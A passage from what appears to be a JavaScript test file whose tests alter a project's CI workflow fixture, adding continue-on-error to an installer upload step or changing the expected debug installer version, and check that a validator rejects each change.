    replace(join(fixture, ".github", "workflows", "ci.yml"), (source) =>
      source.replace(
        "      - name: Upload exact debug installer\n        uses:",
        "      - name: Upload exact debug installer\n        continue-on-error: true\n        uses:",
      ),
    );
  });
  assertRejected(result, /CI artifact.*fields|control/i);
});

test("CI debug installer path rejects the previous 0.2.0 version", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "ci.yml"), (source) =>
      source.replace(
        "target/debug/bundle/nsis/ability-radar_0.2.2_x64-setup.exe",
        "target/debug/bundle/nsis/ability-radar_0.2.0_x64-setup.exe",
      ));
  });
  assertRejected(result, /CI artifact.*0\.2\.1|exact debug NSIS installer/i);
});
